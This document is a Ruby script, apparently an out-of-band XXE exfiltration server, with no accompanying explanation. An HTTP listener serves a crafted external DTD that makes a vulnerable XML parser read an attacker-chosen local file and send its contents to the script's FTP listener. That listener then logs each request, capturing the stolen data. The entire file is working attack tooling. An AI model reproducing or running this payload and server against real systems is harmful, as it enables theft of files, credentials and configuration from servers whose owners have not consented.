require 'socket'

ftp_server = TCPServer.new 8000
http_server = TCPServer.new 8003

log = File.open( "xxe-ftp.log", "a")

server="localhost"

Thread.start do
loop do
  Thread.start(http_server.accept) do |http_client|
        puts "HTTP. New client connected"
        loop {
                req = http_client.gets()
                break if req.nil?
                if req.start_with? "GET"
                        path = req.scan(/\?path=(.*) /)
                        puts path
                        payload = "<!ENTITY % asd SYSTEM \"file://#{path[0][0]}\">\r\n<!ENTITY % c \"<!ENTITY &#37; rrr SYSTEM 'ftp://#{server}:8000/%asd;'>\">\r\n%c;"
                        http_client.puts("HTTP/1.1 200 OK\r\nContent-length: #{payload.length}\r\n\r\n#{payload}")
                end

        }
        puts "HTTP. Connection closed"
  end
end

end

Thread.start do
loop do
  Thread.start(ftp_server.accept) do |ftp_client|
        puts "FTP. New client connected"
        ftp_client.puts("220 xxe-ftp-server")
        loop {
                req = ftp_client.gets()
                break if req.nil?
                puts "< "+req
                log.write "get req: #{req.inspect}\n"

                if req.include? "LIST"
                        ftp_client.puts("drwxrwxrwx 1 owner group          1 Feb 21 04:37 test")
                        ftp_client.puts("150 Opening BINARY mode data connection for /bin/ls")
                        ftp_client.puts("226 Transfer complete.")
                elsif req.include? "USER"
                        ftp_client.puts("331 password please - version check")
                elsif req.include? "PORT"
                        puts "! PORT received"
                        puts "> 200 PORT command ok"
                        ftp_client.puts("200 PORT command ok")
                else
                        puts "> 230 more data please!"
                        ftp_client.puts("230 more data please!")
                end
        }
        puts "FTP. Connection closed"
  end
end
end

loop do
        sleep(10000)
end
